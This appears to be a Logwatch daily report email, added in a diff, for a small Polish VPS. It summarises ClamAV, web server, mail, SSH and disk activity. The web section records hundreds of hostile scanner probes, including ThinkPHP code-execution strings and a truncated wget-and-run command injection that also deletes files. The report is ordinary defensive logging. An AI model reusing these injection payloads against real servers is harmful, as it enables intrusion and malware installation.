@@ -1,0 +1,459 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id 34BD79F20473; Wed,  5 Feb 2020 03:34:14 +0100 (CET)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20200205023414.34BD79F20473@hrankiety.pl>
+Date: Wed,  5 Feb 2020 03:34:07 +0100 (CET)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Wed Feb  5 03:34:07 2020
+        Date Range Processed: yesterday
+                              ( 2020-Feb-04 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Tue Feb  4 04:47:09 2020
+ 
+ Last Status:
+    WARNING: Your ClamAV installation is OUTDATED!
+    WARNING: Local version: 0.100.3 Recommended version: 0.102.1
+    DON'T PANIC! Read https://www.clamav.net/documents/upgrading-clamav
+    main.cld is up to date (version: 59, sigs: 4564902, f-level: 60, builder: sigmgr)
+    Downloading daily-25715.cdiff [100%]
+    daily.cld updated (version: 25715, sigs: 2175057, f-level: 63, builder: raynman)
+    Can't query daily.25715.93.1.0.6810DB54.ping.clamav.net
+    bytecode.cld is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)
+    Database updated (6740053 signatures) from db.local.clamav.net (IP: 104.16.219.84)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ Connection attempts using mod_proxy:
+    222.186.19.221 -> ip.ws.126.net:443: 2 Time(s)
+ 
+ A total of 6 sites probed the server 
+    171.67.70.88
+    178.54.86.119
+    185.156.177.234
+    193.188.22.187
+    193.188.22.229
+    71.6.165.200
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 2 Time(s)
+       null: 5 Time(s)
+    404 Not Found
+       /%73%65%65%79%6F%6E/%68%74%6D%6C%6F%66%66% ... %72%76%6C%65%74: 1 Time(s)
+       /%75%73%65%72%2e%70%68%70: 1 Time(s)
+       /%75%73%65%72/%72%65%67%69%73%74%65%72?%65 ... %5f%61%6a%61%78: 1 Time(s)
+       /1/index.php: 1 Time(s)
+       /123131/index.php: 1 Time(s)
+       /1ts.php: 1 Time(s)
+       /1x.php: 1 Time(s)
+       /2phpmyadmin/index.php?lang=en: 2 Time(s)
+       /321/index.php: 1 Time(s)
+       /411.php: 1 Time(s)
+       /415.php: 1 Time(s)
+       /421.php: 1 Time(s)
+       /5678.php: 1 Time(s)
+       /887.php: 1 Time(s)
+       /9678.php: 1 Time(s)
+       /981.php: 1 Time(s)
+       /98k.php: 1 Time(s)
+       /Adminb20474bc/Login.php: 1 Time(s)
+       /App/?content=die(md5(HelloThinkPHP)): 1 Time(s)
+       /Joomla/: 2 Time(s)
+       /MyAdmin/index.php?lang=en: 2 Time(s)
+       /MyAdmin/scripts/db___.init.php: 1 Time(s)
+       /MyAdmin/scripts/setup.php: 1 Time(s)
+       /MySQLAdmin/index.php: 1 Time(s)
+       /PMA/index.php?lang=en: 2 Time(s)
+       /PMA2/index.php: 1 Time(s)
+       /PMA2011/index.php?lang=en: 2 Time(s)
+       /PMA2012/index.php?lang=en: 2 Time(s)
+       /PMA2013/index.php?lang=en: 2 Time(s)
+       /PMA2014/index.php?lang=en: 2 Time(s)
+       /PMA2015/index.php?lang=en: 2 Time(s)
+       /PMA2016/index.php?lang=en: 2 Time(s)
+       /PMA2017/index.php?lang=en: 2 Time(s)
+       /PMA2018/index.php?lang=en: 2 Time(s)
+       /PMA2019/index.php?lang=en: 2 Time(s)
+       /PMA2020/index.php?lang=en: 2 Time(s)
+       /SQL/index.php: 1 Time(s)
+       /TP/public/index.php: 1 Time(s)
+       /WWW/phpMyAdmin/index.php: 1 Time(s)
+       /_query.php: 1 Time(s)
+       /a411.php: 1 Time(s)
+       /aa.php: 1 Time(s)
+       /aaa.php: 1 Time(s)
+       /admin/PMA/index.php: 1 Time(s)
+       /admin/db/index.php?lang=en: 2 Time(s)
+       /admin/index.php: 1 Time(s)
+       /admin/index.php?lang=en: 2 Time(s)
+       /admin/mysql/index.php: 1 Time(s)
+       /admin/pMA/index.php?lang=en: 2 Time(s)
+       /admin/phpMyAdmin/index.php: 1 Time(s)
+       /admin/phpMyAdmin/index.php?lang=en: 2 Time(s)
+       /admin/phpmyadmin/index.php: 1 Time(s)
+       /admin/phpmyadmin/index.php?lang=en: 2 Time(s)
+       /admin/phpmyadmin2/index.php: 1 Time(s)
+       /admin/pma/index.php: 1 Time(s)
+       /admin/sqladmin/index.php?lang=en: 2 Time(s)
+       /admin/sysadmin/index.php?lang=en: 2 Time(s)
+       /admin/web/index.php?lang=en: 2 Time(s)
+       /administrator/PMA/index.php?lang=en: 2 Time(s)
+       /administrator/admin/index.php?lang=en: 2 Time(s)
+       /administrator/db/index.php?lang=en: 2 Time(s)
+       /administrator/phpMyAdmin/index.php?lang=en: 2 Time(s)
+       /administrator/phpmyadmin/index.php?lang=en: 2 Time(s)
+       /administrator/pma/index.php?lang=en: 2 Time(s)
+       /administrator/web/index.php?lang=en: 2 Time(s)
+       /ak.php: 1 Time(s)
+       /bb.php: 1 Time(s)
+       /bbq.php: 1 Time(s)
+       /bbs.php: 1 Time(s)
+       /bbs/index.php: 1 Time(s)
+       /claroline/phpMyAdmin/index.php: 1 Time(s)
+       /cmd.php: 2 Time(s)
+       /cmv.php: 1 Time(s)
+       /coonig.php: 1 Time(s)
+       /d7.php: 1 Time(s)
+       /database/index.php?lang=en: 2 Time(s)
+       /db/db-admin/index.php?lang=en: 2 Time(s)
+       /db/dbadmin/index.php?lang=en: 2 Time(s)
+       /db/dbweb/index.php?lang=en: 2 Time(s)
+       /db/index.php: 1 Time(s)
+       /db/index.php?lang=en: 2 Time(s)
+       /db/myadmin/index.php?lang=en: 2 Time(s)
+       /db/phpMyAdmin-3/index.php?lang=en: 2 Time(s)
+       /db/phpMyAdmin/index.php?lang=en: 2 Time(s)
+       /db/phpMyAdmin3/index.php?lang=en: 2 Time(s)
+       /db/phpmyadmin/index.php?lang=en: 2 Time(s)
+       /db/phpmyadmin3/index.php?lang=en: 2 Time(s)
+       /db/webadmin/index.php?lang=en: 2 Time(s)
+       /db/webdb/index.php?lang=en: 2 Time(s)
+       /db/websql/index.php?lang=en: 2 Time(s)
+       /db_cts.php: 1 Time(s)
+       /db_pma.php: 1 Time(s)
+       /dbadmin/index.php: 1 Time(s)
+       /dbadmin/index.php?lang=en: 2 Time(s)
+       /desktop.ini.php: 1 Time(s)
+       /doudou.php: 1 Time(s)
+       /download/index.php: 1 Time(s)
+       /dp.php: 1 Time(s)
+       /elrekt.php?s=%2f%69%6e%64%65%78%2f%5c%74% ... %6e%6b%50%48%50: 1 Time(s)
+       /floaw.php: 1 Time(s)
+       /forum.php: 1 Time(s)
+       /forum/index.php: 1 Time(s)
+       /forums/index.php: 1 Time(s)
+       /hd.php: 1 Time(s)
+       /hell.php: 1 Time(s)
+       /help.php: 1 Time(s)
+       /hhhhhh.php: 1 Time(s)
+       /hs.php: 1 Time(s)
+       /htdocs.php: 1 Time(s)
+       /hue2.php: 1 Time(s)
+       /huoshan.php: 1 Time(s)
+       /images/!.php: 1 Time(s)
+       /images/attari.php: 1 Time(s)
+       /images/stories/cmd.php: 1 Time(s)
+       /indea.php: 1 Time(s)
+       /index.php: 3 Time(s)
+       /index.php?lang=en: 2 Time(s)
+       /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%6 ... %6e%6b%50%48%50: 1 Time(s)
+       /index.php?s=/Index/\\think\\app/invokefun ... ]=HelloThinkPHP: 1 Time(s)
+       /index.php?s=/module/action/param1/${@die( ... elloThinkPHP))}: 1 Time(s)
+       /izom.php: 1 Time(s)
+       /java.php: 1 Time(s)
+       /jbb.php: 1 Time(s)
+       /jj1.php: 1 Time(s)
+       /jjj.php: 1 Time(s)
+       /joomla/: 1 Time(s)
+       /kk.php: 1 Time(s)
+       /knal.php: 1 Time(s)
+       /l.php: 1 Time(s)
+       /lala-dpr.php: 1 Time(s)
+       /lang.php?f=1: 1 Time(s)
+       /license.php: 1 Time(s)
+       /log.php: 1 Time(s)
+       /logon.php: 1 Time(s)
+       /manager/html: 1 Time(s)
+       /meijianxue.php: 1 Time(s)
+       /muhstik-dpr.php: 1 Time(s)
+       /muhstik.php: 1 Time(s)
+       /muhstik2.php: 1 Time(s)
+       /muhstiks.php: 1 Time(s)
+       /my.php: 1 Time(s)
+       /myadmin/index.php: 1 Time(s)
+       /myadmin/index.php?lang=en: 2 Time(s)
+       /myadmin/scripts/db___.init.php: 1 Time(s)
+       /myadmin/scripts/setup.php: 1 Time(s)
+       /mysql-admin/index.php: 1 Time(s)
+       /mysql-admin/index.php?lang=en: 2 Time(s)
+       /mysql/admin/index.php: 1 Time(s)
+       /mysql/admin/index.php?lang=en: 2 Time(s)
+       /mysql/db/index.php?lang=en: 2 Time(s)
+       /mysql/dbadmin/index.php?lang=en: 2 Time(s)
+       /mysql/index.php?lang=en: 2 Time(s)
+       /mysql/mysqlmanager/index.php: 1 Time(s)
+       /mysql/mysqlmanager/index.php?lang=en: 2 Time(s)
+       /mysql/pMA/index.php?lang=en: 2 Time(s)
+       /mysql/pma/index.php?lang=en: 2 Time(s)
+       /mysql/sqlmanager/index.php: 1 Time(s)
+       /mysql/sqlmanager/index.php?lang=en: 2 Time(s)
+       /mysql/web/index.php?lang=en: 2 Time(s)
+       /mysql_admin/index.php: 1 Time(s)
+       /mysqladmin/index.php?lang=en: 2 Time(s)
+       /mysqlmanager/index.php?lang=en: 2 Time(s)
+       /no1.php: 1 Time(s)
+       /payload.php: 2 Time(s)
+       /php-my-admin/index.php?lang=en: 2 Time(s)
+       /php-myadmin/index.php?lang=en: 2 Time(s)
+       /php2MyAdmin/index.php: 1 Time(s)
+       /phpMyAbmin/index.php: 1 Time(s)
+       /phpMyAdm1n/index.php: 1 Time(s)
+       /phpMyAdmin-3/index.php?lang=en: 2 Time(s)
+       /phpMyAdmin._/index.php: 1 Time(s)
+       /phpMyAdmin.old/index.php: 1 Time(s)
+       /phpMyAdmin/index.php: 1 Time(s)
+       /phpMyAdmin/index.php?lang=en: 2 Time(s)
+       /phpMyAdmin/phpMyAdmin/index.php: 1 Time(s)
+       /phpMyAdmin/scripts/db___.init.php: 1 Time(s)
+       /phpMyAdmin/scripts/setup.php: 1 Time(s)
+       /phpMyAdmin1/index.php: 1 Time(s)
+       /phpMyAdmin123/index.php: 1 Time(s)
+       /phpMyAdmin2/index.php?lang=en: 2 Time(s)
+       /phpMyAdmin3/index.php?lang=en: 2 Time(s)
+       /phpMyAdmin333/index.php: 1 Time(s)
+       /phpMyAdmin4.8.0/index.php: 1 Time(s)
+       /phpMyAdmin4.8.1/index.php: 1 Time(s)
+       /phpMyAdmin4.8.2/index.php: 1 Time(s)
+       /phpMyAdmin4.8.4/index.php: 1 Time(s)
+       /phpMyAdmin4.8.5/index.php: 1 Time(s)
+       /phpMyAdmin4/index.php?lang=en: 2 Time(s)
+       /phpMyAdmin_111/index.php: 1 Time(s)
+       /phpMyAdmin__/index.php: 1 Time(s)
+       /phpMyAdmin_ai/index.php: 1 Time(s)
+       /phpMyAdminhf/index.php: 1 Time(s)
+       /phpMyAdminold/index.php: 1 Time(s)
+       /phpMyAdmins/index.php: 1 Time(s)
+       /phpMyAdmion/index.php: 1 Time(s)
+       /phpMyadmi/index.php: 1 Time(s)
+       /phpMyadmin/index.php?lang=en: 2 Time(s)
+       /phpMyadmin_bak/index.php: 1 Time(s)
+       /phpMydmin/index.php: 1 Time(s)
+       /phpNyAdmin/index.php: 1 Time(s)
+       /phpadmin/index.php: 1 Time(s)
+       /phpdm.php: 1 Time(s)
+       /phpinfo.php: 1 Time(s)
+       /phpma/index.php: 1 Time(s)
+       /phpmadmin/index.php: 1 Time(s)
+       /phpmy-admin/index.php?lang=en: 2 Time(s)
+       /phpmy/index.php?lang=en: 2 Time(s)
+       /phpmyAdmin/index.php?lang=en: 2 Time(s)
+       /phpmyadm1n/index.php: 1 Time(s)
+       /phpmyadmin-old/index.php: 1 Time(s)
+       /phpmyadmin/index.php?lang=en: 2 Time(s)
+       /phpmyadmin/scripts/db___.init.php: 1 Time(s)
+       /phpmyadmin/scripts/setup.php: 1 Time(s)
+       /phpmyadmin0/index.php: 1 Time(s)
+       /phpmyadmin1/index.php: 1 Time(s)
+       /phpmyadmin1/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2/index.php: 1 Time(s)
+       /phpmyadmin2/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2011/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2012/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2013/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2014/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2015/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2016/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2017/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2018/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2019/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2020/index.php?lang=en: 2 Time(s)
+       /phpmyadmin2222/index.php: 1 Time(s)
+       /phpmyadmin3/index.php?lang=en: 2 Time(s)
+       /phpmyadmin3333/index.php: 1 Time(s)
+       /phpmyadmin4/index.php?lang=en: 2 Time(s)
+       /phppma/index.php: 1 Time(s)
+       /phppma/index.php?lang=en: 2 Time(s)
+       /plugins/weathermap/editor.php: 1 Time(s)
+       /pma/index.php: 1 Time(s)
+       /pma/index.php?lang=en: 2 Time(s)
+       /pma/scripts/db___.init.php: 1 Time(s)
+       /pma/scripts/setup.php: 1 Time(s)
+       /pma2011/index.php?lang=en: 2 Time(s)
+       /pma2012/index.php?lang=en: 2 Time(s)
+       /pma2013/index.php?lang=en: 2 Time(s)
+       /pma2014/index.php?lang=en: 2 Time(s)
+       /pma2015/index.php?lang=en: 2 Time(s)
+       /pma2016/index.php?lang=en: 2 Time(s)
+       /pma2017/index.php?lang=en: 2 Time(s)
+       /pma2018/index.php?lang=en: 2 Time(s)
+       /pma2019/index.php?lang=en: 2 Time(s)
+       /pma2020/index.php?lang=en: 2 Time(s)
+       /pmamy/index.php: 1 Time(s)
+       /pmamy2/index.php: 1 Time(s)
+       /pmd/index.php: 1 Time(s)
+       /pp.php: 1 Time(s)
+       /program/index.php: 1 Time(s)
+       /program/index.php?lang=en: 2 Time(s)
+       /pwd/index.php: 1 Time(s)
+       /qq.php: 1 Time(s)
+       /root.php: 1 Time(s)
+       /s.php: 1 Time(s)
+       /s/index.php: 1 Time(s)
+       /sane.php: 1 Time(s)
+       /scripts/setup.php: 1 Time(s)
+       /secure/ContactAdministrators!default.jspa: 1 Time(s)
+       /setup.cgi?next_file=netgear.cfg&todo=sysc ... ntsetting.htm=1: 1 Time(s)
+       /sheep.php: 1 Time(s)
+       /shell.php: 2 Time(s)
+       /shell?cd+/tmp;rm+-rf+*;wget+http://scan.c ... ws;sh+/tmp/jaws: 3 Time(s)
+       /shopdb/index.php?lang=en: 2 Time(s)
+       /solr/admin/info/system?wt=json: 1 Time(s)
+       /sql/index.php: 1 Time(s)
+       /sql/myadmin/index.php?lang=en: 2 Time(s)
+       /sql/php-myadmin/index.php?lang=en: 2 Time(s)
+       /sql/phpMyAdmin/index.php?lang=en: 2 Time(s)
+       /sql/phpMyAdmin2/index.php?lang=en: 2 Time(s)
+       /sql/phpmanager/index.php?lang=en: 2 Time(s)
+       /sql/phpmy-admin/index.php?lang=en: 2 Time(s)
+       /sql/phpmyadmin2/index.php?lang=en: 2 Time(s)
+       /sql/sql-admin/index.php?lang=en: 2 Time(s)
+       /sql/sql/index.php?lang=en: 2 Time(s)
+       /sql/sqladmin/index.php?lang=en: 2 Time(s)
+       /sql/sqlweb/index.php?lang=en: 2 Time(s)
+       /sql/webadmin/index.php?lang=en: 2 Time(s)
+       /sql/webdb/index.php?lang=en: 2 Time(s)
+       /sql/websql/index.php?lang=en: 2 Time(s)
+       /sqladmin/index.php: 1 Time(s)
+       /sqlmanager/index.php?lang=en: 2 Time(s)
+       /taisui.php: 1 Time(s)
+       /text.php: 1 Time(s)
+       /typo3/phpmyadmin/index.php: 1 Time(s)
+       /undx.php: 1 Time(s)
+       /up.php: 1 Time(s)
+       /uploader.php: 1 Time(s)
+       /v/index.php: 1 Time(s)
+       /version: 1 Time(s)
+       /vvv.php: 1 Time(s)
+       /w.php: 1 Time(s)
+       /wc.php: 1 Time(s)
+       /weathermap/editor.php: 1 Time(s)
+       /weaver/bsh.servlet.BshServlet: 1 Time(s)
+       /webdav/: 1 Time(s)
+       /websql/index.php: 1 Time(s)
+       /whoami.php: 1 Time(s)
+       /whoami.php.php: 1 Time(s)
+       /woshimengmei.php: 1 Time(s)
+       /wp-config.php: 1 Time(s)
+       /wp-content/plugins/portable-phpmyadmin/wp ... dex.php?lang=en: 2 Time(s)
+       /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php: 1 Time(s)
+       /wp-login.php: 1 Time(s)
+       /wpc.php: 1 Time(s)
+       /wpo.php: 1 Time(s)
+       /wuwu11.php: 1 Time(s)
+       /www.php: 1 Time(s)
+       /www/phpMyAdmin/index.php: 1 Time(s)
+       /x.php: 1 Time(s)
+       /xampp/phpmyadmin/index.php: 1 Time(s)
+       /xiaoxia.php: 1 Time(s)
+       /xiu.php: 1 Time(s)
+       /xsser.php: 1 Time(s)
+       /xw.php: 1 Time(s)
+       /xx.php: 1 Time(s)
+       /z.php: 1 Time(s)
+       /zz.php: 1 Time(s)
+       /zzz.php: 1 Time(s)
+    405 Method Not Allowed
+       ip.ws.126.net:443: 2 Time(s)
+    408 Request Timeout
+       null: 2 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+      195   *Warning: Pre-queue content-filter connection overload 
+    14240   SASL authentication failed 
+      190   Miscellaneous warnings 
+ 
+    2.556M  Bytes accepted                         2,680,541
+    2.550M  Bytes delivered                        2,674,346
+ ========   ================================================
+ 
+       57   Accepted                                  48.31%
+       61   Rejected                                  51.69%
+ --------   ------------------------------------------------
+      118   Total                                    100.00%
+ ========   ================================================
+ 
+        1   Reject HELO/EHLO                           1.64%
+       60   Reject unknown user                       98.36%
+ --------   ------------------------------------------------
+       61   Total Rejects                            100.00%
+ ========   ================================================
+ 
+    14407   Connections made      
+    14406   Disconnections        
+       57   Removed from queue    
+       54   Delivered             
+        1   Sent via SMTP         
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+        4   Timeout (inbound)     
+        1   Excessive errors in SMTP commands dialog 
+        1   SASL authenticated messages 
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       89.77.70.146 (89-77-70-146.dynamic.chello.pl): 27 times
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 29 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   24G   27G  48% /
+ none            1.0G  4.0K  1.0G   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
